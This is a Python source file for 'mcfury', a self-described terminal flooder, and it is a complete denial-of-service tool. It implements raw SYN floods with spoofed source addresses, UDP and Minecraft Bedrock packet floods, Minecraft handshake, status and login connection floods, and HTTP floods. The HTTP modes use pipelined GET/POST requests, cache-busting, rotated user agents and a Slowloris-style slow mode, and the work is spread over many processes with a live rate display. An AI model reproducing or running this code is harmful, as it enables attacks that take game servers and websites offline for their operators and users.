#!/usr/bin/env python3
"""mcfury - terminal flooder. Minecraft (raw SYN + protocol) and HTTP (L7)."""
import argparse
import asyncio
import ipaddress
import multiprocessing as mp
import os
import random
import socket
import ssl
import struct
import sys
import time

MAGIC = bytes.fromhex("00ffff00fefefefefdfdfdfd12345678")
ALPHA = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
C = {"rst": "\033[0m", "g": "\033[92m", "y": "\033[93m", "r": "\033[91m", "d": "\033[90m"}

HTTP_METHODS = ("http", "http2", "post", "slow")
UDP_METHODS = ("bedrock", "udp")

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "curl/8.7.1",
    "python-requests/2.32.3",
]

PATHS = ["/", "/index.html", "/api", "/api/v1/status", "/search", "/login",
         "/assets/app.js", "/static/css/main.css", "/favicon.ico", "/robots.txt"]


def varint(n):
    n &= 0xFFFFFFFF
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def mcstr(s):
    b = s.encode()
    return varint(len(b)) + b


def pkt(pid, payload=b""):
    body = varint(pid) + payload
    return varint(len(body)) + body


def handshake(host, port, state, proto=-1):
    return pkt(0x00, varint(proto) + mcstr(host) + struct.pack(">H", port & 0xFFFF) + varint(state))


def status_request():
    return pkt(0x00)


def login_start(name):
    return pkt(0x00, mcstr(name))


def rname(n=8):
    return "".join(random.choices(ALPHA, k=n))


def csum(data):
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def build_syn(dst_ip, dst_port, src_ip):
    sport = random.randint(1024, 65535)
    seq = random.getrandbits(32)
    tcp = struct.pack("!HHIIBBHHH", sport, dst_port, seq, 0, 0x50, 0x02, 65535, 0, 0)
    pseudo = socket.inet_aton(src_ip) + socket.inet_aton(dst_ip) + struct.pack("!BBH", 0, 6, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", csum(pseudo + tcp)) + tcp[18:]
    total = 20 + len(tcp)
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, random.randint(0, 65535), 0x4000,
                     64, 6, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    ip = ip[:10] + struct.pack("!H", csum(ip)) + ip[12:]
    return ip + tcp


def ip_gen(spec):
    if not spec or spec in ("rand", "random"):
        def g():
            while True:
                b = random.getrandbits(32)
                if (b >> 24) in (0, 10, 127) or (b >> 24) >= 224:
                    continue
                return socket.inet_ntoa(struct.pack("!I", b))
        return g
    net = ipaddress.ip_network(spec, strict=False)
    base, size = int(net.network_address), net.num_addresses
    return lambda: str(ipaddress.ip_address(base + random.randrange(size)))


def syn_proc(dst_ip, dst_port, spoof, counters, dur, pool_size):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 << 20)
        s.setblocking(False)
    except OSError as e:
        print(f"raw socket failed: {e}", file=sys.stderr)
        return
    g = ip_gen(spoof)
    pool = [build_syn(dst_ip, dst_port, g()) for _ in range(pool_size)]
    n = len(pool)
    i = pk = bt = 0
    end = time.time() + dur
    while time.time() < end:
        try:
            s.sendto(pool[i], (dst_ip, 0))
        except BlockingIOError:
            time.sleep(0.0002)
            continue
        except OSError:
            pass
        i += 1
        if i >= n:
            i = 0
        pk += 1
        bt += 40
        if not pk & 1023:
            with counters.get_lock():
                counters[0] += pk
                counters[1] += bt
            pk = bt = 0
    with counters.get_lock():
        counters[0] += pk
        counters[1] += bt


def udp_proc(dst_ip, dst_port, counters, dur, mode):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
    s.setblocking(False)
    end = time.time() + dur
    pk = bt = 0
    while time.time() < end:
        if mode == "bedrock":
            p = b"\x01" + struct.pack(">Q", random.getrandbits(63)) + MAGIC + struct.pack(">Q", random.getrandbits(64))
        else:
            p = os.urandom(random.randint(64, 1400))
        try:
            s.sendto(p, (dst_ip, dst_port))
        except BlockingIOError:
            time.sleep(0.0002)
            continue
        except OSError:
            pass
        pk += 1
        bt += len(p)
        if not pk & 255:
            with counters.get_lock():
                counters[0] += pk
                counters[1] += bt
            pk = bt = 0
    with counters.get_lock():
        counters[0] += pk
        counters[1] += bt


def build_req(method, path, host, ua, hdrs, body=None):
    p = path
    if "?" in p:
        p += "&_=" + str(random.getrandbits(48))
    else:
        p += "?_=" + str(random.getrandbits(48))
    lines = [
        f"{method} {p} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {ua}",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br",
        "Connection: keep-alive",
        "Cache-Control: no-cache, no-store",
        "Pragma: no-cache",
    ]
    lines.extend(hdrs)
    if body is not None:
        lines.append(f"Content-Length: {len(body)}")
        lines.append("Content-Type: application/x-www-form-urlencoded")
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + (body or b"")


def make_ctx(tls):
    if not tls:
        return None
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    try:
        c.set_alpn_protocols(["http/1.1"])
    except Exception:
        pass
    return c


async def _http_main(host, port, hostname, mode, conc, dur, timeout, tls, path, hdrs, pipe, counters):
    end = time.time() + dur
    ctx = make_ctx(tls)
    local = [0, 0, 0, 0, 0]

    def flush():
        with counters.get_lock():
            for k in range(5):
                counters[k] += local[k]
                local[k] = 0

    async def conn():
        return await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ctx, server_hostname=hostname if ctx else None),
            timeout)

    async def worker():
        while time.time() < end:
            try:
                r, w = await conn()
            except Exception:
                local[3] += 1
                await asyncio.sleep(0.02)
                continue
            local[2] += 1
            try:
                if mode == "slow":
                    w.write(f"GET {path}?_={random.getrandbits(48)} HTTP/1.1\r\nHost: {hostname}\r\n"
                            f"User-Agent: {random.choice(UAS)}\r\n".encode())
                    await w.drain()
                    local[0] += 1
                    for _ in range(400):
                        if time.time() >= end:
                            break
                        await asyncio.sleep(random.uniform(8, 14))
                        w.write(f"X-{random.randint(0, 9999)}: {random.randint(0, 10**9)}\r\n".encode())
                        await w.drain()
                        local[0] += 1
                        local[1] += 32
                else:
                    meth = "POST" if mode == "post" else "GET"
                    blob = b""
                    for _ in range(pipe):
                        body = None
                        if meth == "POST":
                            body = (f"a={rname(12)}&b={rname(12)}&c={random.getrandbits(40)}").encode()
                        blob += build_req(meth, path, hostname, random.choice(UAS), hdrs, body)
                    w.write(blob)
                    await w.drain()
                    local[0] += pipe
                    local[1] += len(blob)
                    try:
                        d = await asyncio.wait_for(r.read(65536), timeout)
                        if d:
                            local[4] += 1
                    except Exception:
                        pass
            except Exception:
                local[3] += 1
            finally:
                w.close()
                try:
                    await asyncio.wait_for(w.wait_closed(), 1)
                except Exception:
                    pass

    tasks = [asyncio.create_task(worker()) for _ in range(conc)]
    while time.time() < end:
        await asyncio.sleep(0.25)
        flush()
    for t in tasks:
        t.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)
    flush()


def http_proc(host, port, hostname, mode, conc, dur, timeout, tls, path, hdrs, pipe, counters):
    asyncio.run(_http_main(host, port, hostname, mode, conc, dur, timeout, tls, path, hdrs, pipe, counters))


async def _tcp_main(host, port, hostname, method, conc, dur, timeout, counters):
    end = time.time() + dur
    local = [0, 0, 0, 0, 0]

    def flush():
        with counters.get_lock():
            for k in range(5):
                counters[k] += local[k]
                local[k] = 0

    async def worker():
        while time.time() < end:
            m = method
            if method == "mixed":
                m = random.choice(("status", "handshake", "login"))
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout)
            except Exception:
                local[3] += 1
                await asyncio.sleep(0.02)
                continue
            local[2] += 1
            try:
                buf = handshake(hostname, port, 2 if m == "login" else 1)
                if m == "status":
                    buf += status_request()
                elif m == "login":
                    buf += login_start(rname())
                w.write(buf)
                await w.drain()
                local[0] += 1
                local[1] += len(buf)
                try:
                    if await asyncio.wait_for(r.read(8192), timeout):
                        local[4] += 1
                except Exception:
                    pass
            except Exception:
                local[3] += 1
            finally:
                w.close()
                try:
                    await asyncio.wait_for(w.wait_closed(), 1)
                except Exception:
                    pass

    tasks = [asyncio.create_task(worker()) for _ in range(conc)]
    while time.time() < end:
        await asyncio.sleep(0.25)
        flush()
    for t in tasks:
        t.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)
    flush()


def tcp_proc(host, port, hostname, method, conc, dur, timeout, counters):
    asyncio.run(_tcp_main(host, port, hostname, method, conc, dur, timeout, counters))


def resolve(target, port, method, tls):
    host, p = target, port
    if ":" in target and target.count(":") == 1:
        h, q = target.rsplit(":", 1)
        if q.isdigit():
            host, p = h, int(q)
    if p is None:
        if method in UDP_METHODS:
            p = 19132
        elif method in HTTP_METHODS:
            p = 443 if tls else 80
        else:
            p = 25565
    if method in HTTP_METHODS:
        return socket.gethostbyname(host), int(p), host
    try:
        import dns.asyncresolver as R
        ans = R.resolve("_minecraft._tcp." + host, "SRV")
        ans = asyncio.run(asyncio.wait_for(ans, 3))
        rec = sorted(ans, key=lambda r: (r.priority, -r.weight))[0]
        return str(rec.target).rstrip("."), rec.port, host
    except Exception:
        pass
    return socket.gethostbyname(host), int(p), host


def probe(host, port):
    s = socket.create_connection((host, port), 5)
    s.settimeout(5)
    s.sendall(handshake(host, port, 1) + status_request())
    buf = b""
    while len(buf) < 65536:
        d = s.recv(4096)
        if not d:
            break
        buf += d
        if len(buf) > 5:
            break
    s.close()
    import json
    off = 1
    n = buf[0]
    while buf[off - 1] & 0x80:
        n |= (buf[off] & 0x7F) << (7 * off)
        off += 1
    body = buf[off:]
    body = body[2:] if body[1] < 0x80 else body[3:]
    ln = body[0]
    js = json.loads(body[1:1 + ln].decode("utf-8", "replace"))
    v = js.get("version") or {}
    pl = js.get("players") or {}
    return v.get("name"), pl.get("online"), pl.get("max"), js.get("description")


def bar(v, mx, w=24):
    f = 0 if not mx else min(w, int(v / mx * w))
    return C["g"] + "#" * f + C["d"] + "." * (w - f) + C["rst"]


def main():
    a = argparse.ArgumentParser(description="mcfury - terminal flooder (minecraft + http)")
    a.add_argument("target")
    a.add_argument("-p", "--port", type=int)
    a.add_argument("-m", "--method", default="hybrid",
                   choices=["syn", "status", "login", "handshake", "connect", "mixed",
                            "bedrock", "udp", "hybrid", "http", "http2", "post", "slow"])
    a.add_argument("-c", "--concurrency", type=int, default=150)
    a.add_argument("-w", "--processes", type=int, default=min(4, os.cpu_count() or 2))
    a.add_argument("-d", "--duration", type=int, default=60)
    a.add_argument("-t", "--timeout", type=float, default=12.0)
    a.add_argument("--spoof", default="rand")
    a.add_argument("--pool", type=int, default=8192)
    a.add_argument("--tls", action="store_true")
    a.add_argument("--path", default="/")
    a.add_argument("--pipe", type=int, default=8)
    a.add_argument("-H", "--header", action="append", default=[])
    a.add_argument("--probe", action="store_true")
    a = a.parse_args()

    tls = a.tls or a.method == "http2"
    method = "http" if a.method == "http2" else a.method
    ip, port, hostname = resolve(a.target, a.port, method, tls)

    if a.probe:
        try:
            v, on, mx, motd = probe(hostname, port)
            print(f"{hostname}:{port} -> {ip}")
            print(f"version {v} | players {on}/{mx}")
            print(motd)
        except Exception as e:
            print(f"probe failed: {e}")
        return

    if method in ("syn", "hybrid") and os.geteuid() != 0:
        print(f"{C['y']}warning: SYN needs root{C['rst']}")

    counters = mp.Array("Q", 8)
    procs = []
    dur = a.duration

    if method == "hybrid":
        nsyn = max(1, (a.processes * 2) // 3)
        for _ in range(nsyn):
            procs.append(mp.Process(target=syn_proc, args=(ip, port, a.spoof, counters, dur, a.pool)))
        for _ in range(a.processes - nsyn):
            procs.append(mp.Process(target=tcp_proc,
                                    args=(ip, port, hostname, "status", a.concurrency, dur, a.timeout, counters)))
    elif method == "syn":
        for _ in range(a.processes):
            procs.append(mp.Process(target=syn_proc, args=(ip, port, a.spoof, counters, dur, a.pool)))
    elif method in UDP_METHODS:
        for _ in range(a.processes):
            procs.append(mp.Process(target=udp_proc, args=(ip, port, counters, dur, method)))
    elif method in ("http", "post", "slow"):
        for _ in range(a.processes):
            procs.append(mp.Process(target=http_proc,
                                    args=(ip, port, hostname, method, a.concurrency, dur,
                                          a.timeout, tls, a.path, a.header, a.pipe, counters)))
    else:
        for _ in range(a.processes):
            procs.append(mp.Process(target=tcp_proc,
                                    args=(ip, port, hostname, method, a.concurrency, dur, a.timeout, counters)))

    for p in procs:
        p.start()

    t0 = time.time()
    last_pk = last_t = 0
    peak = 0
    try:
        while any(p.is_alive() for p in procs):
            time.sleep(0.25)
            now = time.time()
            tot = counters[0]
            dt = max(now - (last_t or t0), 1e-3)
            pps = (tot - last_pk) / dt
            peak = max(peak, pps)
            mb = counters[1] * 8 / 1e6 / max(now - t0, 1e-3)
            scheme = "https" if tls else "http"
            label = f"{scheme}://{hostname}:{port}{a.path}" if method in ("http", "post", "slow") else f"{hostname}:{port} ({ip})"
            lines = [
                f"{C['g']}MCFURY{C['rst']} {C['d']}terminal flooder{C['rst']}",
                f" target  {label}",
                f" method  {C['y']}{method}{C['rst']}  procs={a.processes}  conc={a.concurrency}",
                f" {bar(pps, max(peak, 1))}",
                f" req/s   {C['g']}{pps:>10.0f}{C['rst']}   peak {peak:.0f}",
                f" mbit    {mb:>10.2f}",
                f" reqs    {tot:>10,}   conns {counters[2]:,}   resp {counters[4]:,}   err {counters[3]:,}",
                f" time    {now - t0:>5.1f}s / {dur}s",
            ]
            sys.stdout.write("\033[H\033[2J" + "\n".join(lines) + "\n")
            sys.stdout.flush()
            last_pk, last_t = tot, now
    except KeyboardInterrupt:
        for p in procs:
            p.terminate()
    for p in procs:
        p.join(2)

    print(f"\n{C['g']}done{C['rst']}  reqs={counters[0]:,}  bytes={counters[1]:,}  "
          f"peak_pps={peak:.0f}  conns={counters[2]:,}  resp={counters[4]:,}  err={counters[3]:,}")


if __name__ == "__main__":
    main()